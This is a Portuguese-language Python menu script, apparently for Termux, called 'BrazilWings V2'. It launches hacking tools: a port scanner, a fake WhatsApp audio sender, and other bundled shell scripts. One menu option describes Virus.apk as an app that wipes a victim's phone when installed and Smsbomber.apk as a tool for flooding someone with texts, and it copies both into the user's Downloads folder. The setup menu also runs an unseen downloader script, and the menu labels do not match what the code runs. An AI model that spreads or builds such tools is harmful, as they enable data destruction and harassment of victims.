import os
clear = lambda: os.system('clear') #clear serve pra limpar a tela


#Aqui eu coloco as funções

iniciar_helewings = lambda: os.system('cd;cd HeleWings;. ./HeleWings.sh;cd;cd BrazilWings')
iniciar_TentameKelzer = lambda: os.system('cd;cd Tentame_Kelzer;. ./TentameKelzer.sh;cd;cd BrazilWings')
iniciar_SYSTEMNERF = lambda: os.system('cd;cd SYSTEM_NERF;. ./systemnerf.sh;cd;cd BrazilWing')
copiar_app_virusapk = lambda: os.system('cp -i Virus.apk /data/data/com.termux/files/home/storage/downloads')
copiar_app_smsbomber = lambda: os.system('cp -i Smsbomber.apk /data/data/com.termux/files/home/storage/downloads')
abrir_site_livro = lambda: os.system('termux-open-url https://www.dropbox.com/scl/fi/9hz49y04l7mhoo1q20k2a/MEULIVRO_COM_CAPA_NOVA.pdf?rlkey=cyho1p4ft00lotncv7xei32zw&dl=0')
sleep = lambda: os.system('sleep 2')
umarquivoemshell = lambda: os.system('. ./baixarresto.sh')
link_manual = lambda: os.system('termux-open-url https://zonamestre.blogspot.com/2024/02/software-para-hacking-e-pentest-do.html')
iniciar_kelzerscan = lambda: os.system('cd;cd KelzerScan;python KelzerScan.py;cd;cd BrazilWings')
slepizao = lambda: os.system('sleep 3') # Sleep serve pra pausar a tela pro usuário por algum tempo






















def menu_da_brazil_wings(): # essa função é do menu
     print ('''
\033[1;36ml=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=l\033[0m
\033[1;36ml\033[0m\033[1;33m 🜲           SOFTWARE EM MODO TEXTO            🜲 \033[0m\033[1;36ml\033[0m\033[1;36m
l=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=l             
l\033[0m\033[1;31m ♱                                             ♱ \033[0m\033[1;36ml\033[0m
\033[1;36ml\033[0m                                                \033[1;36m l\033[0m
\033[1;36ml\033[0m\033[1;31m              ─▄────▄▄▄▄▄▄▄────▄─                \033[0m\033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31m     ▀▀▄─▄█████████▄─▄▀▀       \033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m        \033[1;31m      ────██─▀███▀─██────     \033[0m          \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31m     ──▄─▀████▀████▀─▄──     \033[0m          \033[1;36m l\033[0m
\033[1;36ml\033[0m        \033[1;31m      ▀█────██▀█▀██────█▀    \033[0m           \033[1;36m l\033[0m
\033[1;36ml\033[0m                                                \033[1;36m l\033[0m
\033[1;36ml\033[0m              \033[1;31m   BrazilWings V2      \033[0m           \033[1;36m l\033[0m
\033[1;36ml\033[0m      \033[1;31m   /-----------------------------\   \033[0m     \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m1\033[1;36m] PortScan          \033[0m     \033[1;31ml\033[0m         \033[1;36ml\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m2\033[1;36m] Descobrir estado      \033[0m  \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m   \033[1;36m  Pelo DDD             \033[0m   \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m3\033[1;36m] Enviar aúdio falso no \033[0m  \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m   \033[1;36m  Whatsapp            \033[0m    \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m4\033[1;36m] Sistema antitravas Zap \033[0m \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m    \033[1;36m (ROOT)        \033[0m          \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m5\033[1;36m] Obter Apks de Hacking \033[0m  \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m6\033[1;36m] Menu avançado         \033[0m \033[1;31ml\033[0m       \033[1;36m  l   \033[0m                     
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m7\033[1;36m] Código de cor para  \033[0m    \033[1;31ml\033[0m      \033[1;36m   l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m     \033[1;36mcriar meus próprios    \033[0m \033[1;31ml\033[0m      \033[1;36m   l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m    \033[1;36m Scripts.        \033[0m        \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m8\033[1;36m] O que é licença GPL ?  \033[0m \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m9\033[1;36m] Baixar o livro do   \033[0m    \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m    \033[1;36m Desenvolvedor    \033[0m       \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m \033[1;36m[\033[0m10\033[1;36m] Sair \033[0m                  \033[1;31ml\033[0m        \033[1;36m l\033[0m
\033[1;36ml\033[0m         \033[1;31ml\033[0m                             \033[1;31ml\033[0m       \033[1;36m  l\033[0m
\033[1;36ml\033[0m       \033[1;31m  \-----------------------------/  \033[0m      \033[1;36m l\033[0m
\033[1;36ml\033[0m      \033[1;31m    FERRAMENTA DE CIBERSEGURANÇA \033[0m         \033[1;36m l\033[0m
\033[1;36ml\033[0m\033[1;31m ♱                 ┌∩┐(◣_◢)┌∩┐                 ♱ \033[0m\033[1;36ml\033[0m
\033[1;36m---------------------------------------------------\033[0m      
     ''') 
     
#Aqui eu termino as funções











#Logo abaixo tem algumas váriaveis para ajudar o programa a funcionar
MENU_CONFG = 0
MENU_BW = 0












#Eu resolvir por um menu antes do menu principal, isso porque é as opções do menu principal são pré-instalados
while MENU_CONFG != "1":
     clear()
     print('''
          \033[36m--------------------\033[0m
         \033[33m SEJA BEM-VINDO(A) :D\033[0m
        \033[36m  --------------------\033[0m
        \033[1m  MENU DE CONFIGURAÇÕES INICIAIS:\033[0m
        \033[32m  1 - INICIAR
          2 - BAIXAR O RESTANTE DO SCRIPT
          3 - MANUAL COMPLETO \033[0m
''')
     MENU_CONFG = input('\033[33mDIGITE UM NÚMERO:\033[0m')
     clear()




     
     # condicional encadeado do menu de configurações iniciais
     if MENU_CONFG == "1":
          print('''\033[1;33mVOCÊ SABIA ? \033[0m\033[90mA ideia do criador do script era criar um Lazymux Brasileiro\033[0m''')
          slepizao()
     elif MENU_CONFG == "2":
          umarquivoemshell()
     elif MENU_CONFG == "3":
          link_manual()
     else:
          print('\033[31mVOCÊ DIGITOU UM NÚMERO DIFERENTE ! ;-; \033[0m')
          sleep()














while MENU_BW != "10":
     clear()
     menu_da_brazil_wings()    
     MENU_BW = input('\033[35mDIGITE UM NÚMERO: \033[0m')
     clear()


     match MENU_BW:  
          case "1":
               iniciar_kelzerscan() #chama os shells pra iniciar minha script de PortScan
          case "2":
               print ('''
 \033[1;33m Centro-Oeste:\033[0m\033[1;34m
– Distrito Federal (61)
– Goiás (62 e 64)
– Mato Grosso (65 e 66)
– Mato Grosso do Sul (67)
\033[0m
\033[1;33m  Nordeste\033[0m\033[1;34m
– Alagoas (82)
– Bahia (71, 73, 74, 75 e 77)
– Ceará (85 e 88)
– Maranhão (98 e 99)
– Paraíba (83)
– Pernambuco (81 e 87)
– Piauí (86 e 89)
– Rio Grande do Norte (84)
– Sergipe (79)
\033[0m\033[1;33m
  Norte\033[0m\033[1;34m
– Acre (68)
– Amapá (96)
– Amazonas (92 e 97)
– Pará (91, 93 e 94)
– Rondônia (69)
– Roraima (95)
– Tocantins (63)
\033[0m\033[1;33m
  Sudeste\033[0m\033[1;34m
– Espírito Santo (27 e 28)
– Minas Gerais (31, 32, 33, 34, 35, 37 e 38)
– Rio de Janeiro (21, 22 e 24)
– São Paulo (11, 12, 13, 14, 15, 16, 17, 18 e 19)
\033[0m\033[1;33m
  Sul\033[0m\033[1;34m
– Paraná (41, 42, 43, 44, 45 e 46)
– Rio Grande do Sul (51, 53, 54 e 55)
– Santa Catarina (47, 48 e 49) \033[0m
               ''')
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
          case "3":
               iniciar_helewings()
          case "4":
               iniciar_TentameKelzer()
          case "5":
               iniciar_SYSTEMNERF()
          case "6":
               print ('''\033[34m
O APK VIRUS.APK é um app que quando a vítima instala o mesmo vai apagar tudo do celular dela, e o app sms bomber seve pra enviar vários sms pra pessoa.
                    \033[0m  ''')
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA OBTER OS APKS:\033[0m')






               
               copiar_app_virusapk() #cuidado com esse apk, ele serve pra formatar o cell
               copiar_app_smsbomber() #Cuidado com esse tbm, eu baixei na internet, não sei se tem vírus








               
               clear()
               print ('''\033[31mPRONTO, AGORA VERIFIQUE A SUA PASTA DE DOWNLOADS.\033[0m:
                      ''')
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
          case "7":
               print('\033[1mNEGRITO\033[m     \ 0 3 3 [ 1 m')
               print('\033[3mITÁLICO\033[m     \ 0 3 3 [ 3 m')
               print('\033[4mSUBLINHADO\033[m     \ 0 3 3 [ 4 m')
               print('\033[7mCOR INVERTIDA\033[m     \ 0 3 3 [ 7 m')
               print('\033[9mTACHADO\033[m     \ 0 3 3 [ 9 m')
               print('\033[21mSUBLINHADO\033[m     \ 0 3 3 [ 2 1 m')
               print('\033[30mTEXTO PRETO\033[m     \ 0 3 3 [ 3 0 ')
               print('\033[31mTEXTO VERMELHO\033[m     \ 0 3 3 [ 3 1 m')
               print('\033[32mTEXTO VERDE\033[m     \ 0 3 3 [ 3 2 m')
               print('\033[33mTEXTO AMARELO\033[m     \ 0 3 3 [ 3 3 m')
               print('\033[34mTEXTO AZUL\033[m     \ 0 3 3 [ 3 4 m')
               print('\033[35mTEXTO MAGENTA\033[m     \ 0 3 3 [ 3 5 m')
               print('\033[36mTEXTO CIANO\033[m     \ 0 3 3 [ 3 6 m')
               print('\033[37mTEXTO CINZA\033[m     \ 0 3 3 [ 3 7 m')
               print('\033[40mFUNDO PRETO\033[m     \ 0 3 3 [ 4 0 m')
               print('\033[41mFUNDO VERMELHO\033[m     \ 0 3 3 [ 4 1 m')
               print('\033[42mFUNDO VERDE\033[m     \ 0 3 3 [ 4 2 m')
               print('\033[43mFUNDO AMARELO\033[m     \ 0 3 3 [ 4 3 m')
               print('\033[44mFUNDO AZUL\033[m     \ 0 3 3 [ 4 4 m')
               print('\033[45mFUNDO MAGENTA\033[m     \ 0 3 3 [ 4 5 m')
               print('\033[46mFUNDO CIANO\033[m     \ 0 3 3 [ 4 6 m')
               print('\033[47mFUNDO CINZA\033[m     \ 0 3 3 [ 4 7 m')
               print('\033[51mTEXTO COM BORDA\033[m     \ 0 3 3 [ 5 1 m')
               print('\033[52mTEXTO COM BORDA\033[m     \ 0 3 3 [ 5 2 m')
               print('\033[90mTEXTO AZUL ESCURO\033[m     \ 0 3 3 [ 9 0 m')
               print('\033[100mFUNDO AZUL CLARO\033[m     \ 0 3 3 [ 1 0 0 m')
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
          case "8":
               print ('''\033[34m
Este código tem licença GPL, isso quer dizer que os usuários podem modificar o script e trocar o nome do criador. Porém, eles precisam dizer em alguma parte do programa a seguinte frase "Este Software foi baseado no código-fonte do script BrazilWings.
                    \033[0m  ''')
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
          case "9":
               abrir_site_livro()
          case "10":
               print('''
\033[1;32mDESENVOLVEDOR:\033[0m
     \033[1;34mGabriel Kelzer.\033[0m
\033[1;32mINSTAGRAM:\033[0m
     \033[1;34mhttps://www.instagram.com/gabrielkelzerofc\033[0m
\033[1;32mYOUTUBE:\033[0m
     \033[1;34mhttps://youtube.com/@gabrielkelzer\033[0m\033[1;32m
GRUPO DO WHATSAPP:\033[0m\033[1;34m
     https://chat.whatsapp.com/FPP8FpeyvrnFP81zXTIP5W\033[0m
\033[03;32m"Às vezes criatividade é continuar criando coisas mesmo não sendo reconhecido", Gabriel Kelzer.\033[0m
''')
          case _:
               print ('''\033[31mO número que você digitou é inválido !!!\033[0m 
                      ''') #Essa opção é somente se as anteriores não foram atendidas
               OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
